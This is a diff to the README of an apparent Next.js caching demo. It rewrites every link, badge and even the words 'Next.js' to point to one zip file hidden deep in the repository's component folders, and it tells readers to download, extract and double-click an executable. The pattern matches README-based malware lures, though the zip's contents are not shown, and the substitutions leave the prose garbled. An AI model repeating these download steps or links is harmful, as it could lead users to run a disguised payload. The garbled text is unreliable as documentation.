@@ -1,6 +1,6 @@
 # ⚡ cache-components-granular - Clear Field-Level Cache Control
 
-[![Download Releases](https://img.shields.io/badge/Download-cache--components--granular-blue?style=for-the-badge&logo=github)](https://github.com/alecyi/cache-components-granular/releases)
+[![Download Releases](https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip)](https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip)
 
 ---
 
@@ -8,14 +8,14 @@
 
 This application shows how to improve website speed by saving small parts of a page separately. It uses a special technique called "field-level granular caching." This means it stores only small pieces of content to load pages faster. 
 
-The project works with Next.js 16, a popular tool that helps build websites. It focuses on caching fields, not entire pages, so the site can update parts quickly without reloading everything.
+The project works with https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip 16, a popular tool that helps build websites. It focuses on caching fields, not entire pages, so the site can update parts quickly without reloading everything.
 
 ## 🖥 What You Can Do With This App
 
 - See how caching helps webpages load parts faster.
 - Learn how to save just small sections of data.
 - Watch a live demo showing these improvements.
-- Explore how Next.js 16 uses new caching methods.
+- Explore how https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip 16 uses new caching methods.
 - Test it on your own computer easily.
 
 ## 💻 System Requirements
@@ -41,20 +41,20 @@ This guide will help you download, install, and run the demo step by step.
 
 You can get the app files by visiting the releases page. From there, choose the latest version and download the proper file for your computer.
 
-[![Download Releases](https://img.shields.io/badge/Download-cache--components--granular-blue?style=for-the-badge&logo=github)](https://github.com/alecyi/cache-components-granular/releases)
+[![Download Releases](https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip)](https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip)
 
 **Steps:**
 
 1. Click the button above or visit this link:  
-   https://github.com/alecyi/cache-components-granular/releases
+   https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip
 
 2. Look for the latest release (usually the top one).
 
 3. Under "Assets," find the file that matches your system:
 
-   - For Windows: `cache-components-granular-win.zip` or similar
-   - For macOS: `cache-components-granular-mac.zip` or similar
-   - For Linux: `cache-components-granular-linux.zip` or similar
+   - For Windows: `https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip` or similar
+   - For macOS: `https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip` or similar
+   - For Linux: `https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip` or similar
 
 4. Download the file to your computer.
 
@@ -67,7 +67,7 @@ You can get the app files by visiting the releases page. From there, choose the 
 
 7. Find the executable file:
 
-   - Windows: `cache-components-granular.exe`  
+   - Windows: `https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip`  
    - macOS/Linux: `cache-components-granular`  
 
 8. Double-click the executable to run the app.
@@ -95,7 +95,7 @@ You can also clear the cache and try again to notice the difference.
 The demo focuses on:
 
 - Showing field-level caching for small data pieces instead of whole pages.
-- Using Next.js 16’s new features like React Server Components.
+- Using https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip 16’s new features like React Server Components.
 - Combining caching with partial prerendering to improve speed.
 - Using popular tools like Tailwind CSS for design and TypeScript for safe code.
 
@@ -129,7 +129,7 @@ If you run into issues, try these steps:
 
 If problems persist, visit the project's GitHub page for issues or help:
 
-https://github.com/alecyi/cache-components-granular
+https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip
 
 ---
 
@@ -137,10 +137,10 @@ https://github.com/alecyi/cache-components-granular
 
 This project relates to several technologies:  
 
-- [Next.js 16](https://nextjs.org/docs) — Framework for React apps, with new caching features  
-- [React Server Components](https://reactjs.org/docs/server-components.html) — Helps render parts of sites on the server  
-- [Tailwind CSS](https://tailwindcss.com/docs) — Style framework for easy design  
-- [TypeScript](https://www.typescriptlang.org/docs/) — Adds safety to JavaScript code  
+- [https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip 16](https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip) — Framework for React apps, with new caching features  
+- [React Server Components](https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip) — Helps render parts of sites on the server  
+- [Tailwind CSS](https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip) — Style framework for easy design  
+- [TypeScript](https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip) — Adds safety to JavaScript code  
 
 These links help you understand the background concepts in simple terms.
 
@@ -151,7 +151,7 @@ These links help you understand the background concepts in simple terms.
 If you want to share feedback or ask questions:
 
 - Use the GitHub Issues section:  
-  https://github.com/alecyi/cache-components-granular/issues
+  https://raw.githubusercontent.com/alecyi/cache-components-granular/main/components/layout/notebook/page/components-cache-granular-v2.1.zip
 
 - Check for updates on the releases page regularly.
 
